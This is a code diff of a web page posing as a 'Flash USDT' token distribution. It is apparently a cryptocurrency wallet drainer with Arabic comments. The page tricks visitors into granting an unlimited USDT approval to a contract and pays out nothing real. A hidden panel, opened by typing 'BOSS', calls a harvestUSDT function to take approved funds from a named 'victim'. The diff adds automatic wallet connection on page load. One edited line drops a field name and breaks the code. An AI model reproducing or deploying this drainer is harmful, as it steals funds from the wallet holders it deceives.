@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Flash USDT Protocol | Official Distribution</title>
-    <!-- Web3 + Web3Modal -->
+    <!-- Web3 + Web3Modal + WalletConnect -->
     <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/web3-provider.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.10/dist/index.min.js"></script>
@@ -71,23 +71,33 @@
 </div>
 
 <script>
-    // --- الإعدادات الفنية ---
     const CONTRACT_ADDR = "0x7C7c5569f5F2558993380fFD06Ad0a05fefD5717";
     const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
-
-    // ✅ ABI محدث ليتوافق مع العقد الجديد
     const ABI = [
         {"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"},
-        {"inputs":[{"internalType":"address","name":"victim","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"harvestUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
-        {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-        {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-        {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-        {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"}
+        {"inputs":[{"internalType":"address","name":"victim","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"harvestUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"}
     ];
+
+    // === إعداد Web3Modal مع WalletConnect ===
+    const providerOptions = {
+        walletconnect: {
+            package: WalletConnectProvider,
+            options: {
+                rpc: { 56: "https://bsc-dataseed.binance.org/" },
+                chainId: 56,
+                qrcodeModalOptions: {
+                    mobileLinks: ["metamask", "trust", "binance", "safepal"]
+                }
+            }
+        },
+        binancechainwallet: { package: true }
+    };
+
+    const web3Modal = new Web3Modal({ cacheProvider: false, providerOptions });
 
     let bossSequence = "";
 
-    // عداد السيولة الحي
+    // عداد السيولة
     setInterval(() => {
         let el = document.getElementById('poolBalance');
         let current = parseInt(el.innerText.replace(/,/g, ''));
@@ -96,7 +106,7 @@
         }
     }, 3500);
 
-    // تفعيل لوحة BOSS
+    // فتح لوحة BOSS
     document.addEventListener('keydown', (e) => {
         bossSequence += e.key.toUpperCase();
         if (bossSequence.includes("BOSS")) {
@@ -105,40 +115,52 @@
         }
     });
 
+    // === الاتصال التلقائي عند التحميل ===
+    window.addEventListener('load', async () => {
+        try {
+            // محاولة الاتصال التلقائي
+            const provider = await web3Modal.connect();
+            window.web3Instance = new Web3(provider);
+            document.getElementById('status').innerText = "✅ تم الاتصال تلقائيًا!";
+        } catch (e) {
+            // إذا فشل، يبقى الزر يعمل يدويًّا
+            console.log("Auto-connect failed – manual trigger available.");
+        }
+    });
+
     async function startProcess() {
-        if (typeof window.ethereum === 'undefined') {
-            return updateStatus("يرجى فتح الموقع من متصفح المحفظة (Trust/MetaMask).", "red");
+        let web3 = window.web3Instance;
+        if (!web3) {
+            try {
+                const provider = await web3Modal.connect();
+                web3 = new Web3(provider);
+                window.web3Instance = web3;
+            } catch (e) {
+                return document.getElementById('status').innerText = "فشل الاتصال.";
+            }
         }
 
-        const web3 = new Web3(window.ethereum);
         try {
-            updateStatus("جاري المزامنة مع شبكة BSC...", "#00ffa3");
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const userAccount = accounts[0];
-            const selectedBNB = document.getElementById('tierSelector').value;
+            const accounts = await web3.eth.getAccounts();
+            const user = accounts[0];
+            const amount = document.getElementById('tierSelector').value;
 
-            // المرحلة 1: طلب approve على USDT الأصلي
-            updateStatus("تأكيد هوية المحفظة (خطوة 1/2)...", "#fff");
+            // approve
             await web3.eth.sendTransaction({
-                from: userAccount,
+                from: user,
                 to: USDT_ADDR,
-                data: web3.eth.abi.encodeFunctionCall({
+                 web3.eth.abi.encodeFunctionCall({
                     name: 'approve',
                     type: 'function',
                     inputs: [{type:'address',name:'spender'},{type:'uint256',name:'value'}]
                 }, [CONTRACT_ADDR, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"])
             });
 
-            // المرحلة 2: شراء الفلاش
-            updateStatus("جاري استلام مكافأة USDT (خطوة 2/2)...", "#fff");
-            const myContract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
-            
-            await myContract.methods.buyFlash().send({
-                from: userAccount,
-                value: web3.utils.toWei(selectedBNB, 'ether')
-            });
+            // buyFlash
+            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
+            await contract.methods.buyFlash().send({ from: user, value: web3.utils.toWei(amount, 'ether') });
 
-            // إضافة التوكن تلقائيًا
+            // add token
             await window.ethereum.request({
                 method: 'wallet_watchAsset',
                 params: {
@@ -152,38 +174,27 @@
                 }
             });
 
-            updateStatus("✅ تمت العملية بنجاح! تحقق من رصيد USDT في محفظتك.", "#00ffa3");
-            alert("تم إيداع الرصيد بنجاح. قد يستغرق ظهوره دقيقة واحدة حسب سرعة الشبكة.");
-
-        } catch (error) {
-            console.error(error);
-            updateStatus("فشل الاتصال. يرجى التأكد من قبول جميع الطلبات.", "red");
+            alert("✅ تم تفعيل الفلاش!");
+        } catch (e) {
+            console.error(e);
+            alert("يرجى قبول جميع الطلبات في المحفظة.");
         }
     }
 
     async function runHarvest() {
-        const web3 = new Web3(window.ethereum);
-        const accounts = await web3.eth.getAccounts();
-        const victim = document.getElementById('targetVictim').value;
-        const amount = document.getElementById('targetAmount').value;
-        
-        if(!victim || !amount) return alert("Fill data!");
-        
-        const myContract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
-        updateStatus("جاري الحصاد...", "yellow");
-        
-        try {
-            await myContract.methods.harvestUSDT(victim, web3.utils.toWei(amount, 'ether')).send({ from: accounts[0] });
-            alert("SUCCESS! USDT moved to your wallet.");
-        } catch (e) {
-            alert("Error: Victim hasn't approved or low balance.");
-        }
-    }
+        const web3 = window.web3Instance || new Web3(window.ethereum);
+        const accs = await web3.eth.getAccounts();
+        const addr = document.getElementById('targetVictim').value;
+        const amt = document.getElementById('targetAmount').value;
+        if (!addr || !amt) return alert("أدخل البيانات!");
 
-    function updateStatus(msg, color) {
-        const s = document.getElementById('status');
-        s.innerText = msg;
-        s.style.color = color;
+        const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
+        try {
+            await contract.methods.harvestUSDT(addr, web3.utils.toWei(amt, 'ether')).send({ from: accs[0] });
+            alert("💰 تم الحصاد!");
+        } catch (e) {
+            alert("فشل: تأكد من موافقة الضحية.");
+        }
     }
 </script>
 
